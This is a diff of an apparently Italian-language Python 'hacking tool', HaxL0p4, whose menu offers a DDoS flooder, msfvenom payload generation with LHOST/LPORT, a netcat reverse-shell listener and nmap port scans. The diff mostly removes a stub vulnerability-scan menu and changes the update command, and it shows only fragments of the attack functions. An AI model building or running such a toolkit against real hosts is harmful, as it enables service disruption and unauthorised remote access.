@@ -20,7 +20,6 @@ import sys
 import string
 
 
-
 opzione_non_valida = f"{Fore.RED} [💀] Opzione non valida... {Style.RESET_ALL}\n"
 
 Remote_options = f"""
@@ -75,21 +74,6 @@ opzioni_menu = f"""
  ║ [{Fore.RED}0{Style.RESET_ALL}] Exit                         ║
  ╚══════════════════════════════════╝
 """
-
-
-vuln_scan_options = f"""
- ╔══════════════════════════════════╗
- ║ [1] SQL Injection Scan           ║ 
- ║ [2] XSS Scan                     ║
- ╚══════════════════════════════════╝
- ╔══════════════════════════════════╗
- ║ [{Fore.RED}0{Style.RESET_ALL}] Back                         ║
- ╚══════════════════════════════════╝  
-"""
-
-
-
-
 
 
 def animazione_lettere(testo, ms):
@@ -199,7 +183,7 @@ def HaxL0p4_Ddos():
         s.connect((host,int(port)))
         s.settimeout(1)
     except socket.error as e:
-        animazione_lettere(f"{Fore.RED} [❗] Invalid ip address. Check the ip or the port and try again...",0.03)
+        print("\033[91m Controlla l'indirizzo del server e la porta\033[0m")
         sys.exit()
 
     # Creazione e avvio dei thread
@@ -226,7 +210,6 @@ def HaxL0p4_Ddos():
 
 
 
-
 # ========================== #
 
 parser = argparse.ArgumentParser(description="HaxL0p4 hacking tool")
@@ -234,7 +217,7 @@ parser.add_argument('--update', action="store_true", help="Update HaxL0p4 tool")
 args = parser.parse_args()
 
 if args.update:
-    os.system("git pull")
+    os.system("git stash && git pull")
     animazione_lettere(f"\n{Fore.RED}[❗] Please restart the tool...", 0.03)
     sys.exit()
 else:
@@ -250,9 +233,6 @@ def startNgrokServer():
 
 
 
-
-
-
 def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
     if modulo == 1:
         print("\n")
@@ -262,10 +242,6 @@ def createPayload(modulo, LHOST, LPORT, NAME, FORMAT):
     elif modulo == 3:
         typeModule = input("\nMODULE > ")
         os.system(f"sufo msfvenom -p {typeModule} LHOST={LHOST} LPORT={LPORT} -f {FORMAT} -o {NAME}.{FORMAT}")
-
-
-
-
 
 
 
@@ -342,8 +318,6 @@ def setPayload():
             return menu()
 
 
-
-
 # Ascoltatore netcat reverse shell
 
 def netcatListener():
@@ -398,7 +372,6 @@ def arp_scan():
 
 
 
-
 def ip_scanner():
     os.system("clear && figlet HaxL0p4")
 
@@ -429,7 +402,6 @@ def ip_scanner():
             animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
             scanner.scan(ip_addr, '1-1024', arguments="-v -sS")
             print(f"tcp: method: syn, services: 1-1024\n Ip Status: up")
-            #print(scanner[ip_addr].all_protocols())
             open_ports = scanner[ip_addr]['tcp'].keys()
             formatted_ports = ', '.join(map(str, open_ports))
             print(" Open Ports: ", formatted_ports)
@@ -441,7 +413,6 @@ def ip_scanner():
             animazione_lettere(f" {Fore.RED}[!] Scansione in corso...{Style.RESET_ALL}\n\n ", 0.03)
             scanner.scan(ip_addr, '1-1024', arguments="-v -sU")
             print(f"udp: services: 1-1024\n Ip Status: {Fore.RED}up{Style.RESET_ALL}")
-            #print(scanner[ip_addr].all_protocols())
             open_ports = scanner[ip_addr]['udp'].keys()
             formatted_ports = ', '.join(map(str, open_ports))
             print(" Open Ports: ", formatted_ports)
@@ -556,29 +527,6 @@ def network():
 
 
 
-
-def vuln_scan():
-    os.system("clear && figlet Hax-Scan")
-    print(vuln_scan_options)
-
-    s = input(f"\n{Fore.CYAN} HaxL0p4/VulnScan{Style.RESET_ALL} > ")
-
-    while True:
-        if s == "1":
-            #scan_for_sql_injection()
-            animazione_lettere("\n"+opzione_non_valida,0.03)
-            vuln_scan()
-        elif s == "2":
-            animazione_lettere("\n"+opzione_non_valida,0.03)
-            vuln_scan()
-        elif s == "0":
-            menu()
-        else:
-            animazione_lettere("\n"+opzione_non_valida, 0.03)
-            vuln_scan()
-
-
-
 def get_public_ip():
     response = requests.get("https://api.ipify.org")
     return response.text
@@ -674,17 +622,13 @@ def menu():
                 RemoteAccess()
             elif s == "2":
                 network()
-         #   elif s == "3":
-          #      #vuln_scan()
-          #     animazione_lettere("\n"+opzione_non_valida,0.03)
-           #     menu()
             elif s == "3":
                 while True:
                     HaxL0p4_Ddos()
             elif s == "4":
                 ipGeolocation()
             elif s == "6":
-                os.system("git pull")
+                os.system("git stash && git pull")
                 animazione_lettere(f"\n{Fore.RED}[❗] Please restart the tool...", 0.03)
                 break
             elif s == "0":
